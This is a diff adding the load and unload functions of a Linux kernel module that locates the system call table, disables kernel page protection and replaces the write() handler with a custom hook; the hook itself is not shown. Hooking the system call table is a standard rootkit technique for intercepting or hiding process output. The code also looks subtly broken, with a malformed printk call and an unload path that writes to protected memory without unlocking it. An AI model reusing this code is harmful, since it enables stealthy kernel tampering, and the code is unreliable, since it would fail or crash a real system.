@@ -60,3 +60,35 @@ static void enable_page_protection(void)
 }
 
 
+// This function is executed when the module is loaded.
+static int __init prog_start(void) 
+{
+	printk(KERN_ALERT, "Module is loaded\n");
+    if(!(sys_call_table = aquire_sys_call_table())) {
+             return -1;
+    }
+
+    disable_page_protection();
+
+    ref_sys_write = (void *)sys_call_table[__NR_write];
+    sys_call_table[__NR_write] = (unsigned long *)new_sys_write;
+
+    enable_page_protection();
+
+    return 0;
+}
+
+// This method is executed when the module is removed/unloaded
+static void __exit prog_exit(void) 
+{
+	printk(KERN_ALERT, "Module is unloading\n");
+
+    if(!sys_call_table)
+        return; 
+    sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
+   
+}
+
+module_init(prog_start);
+module_exit(prog_exit);
+
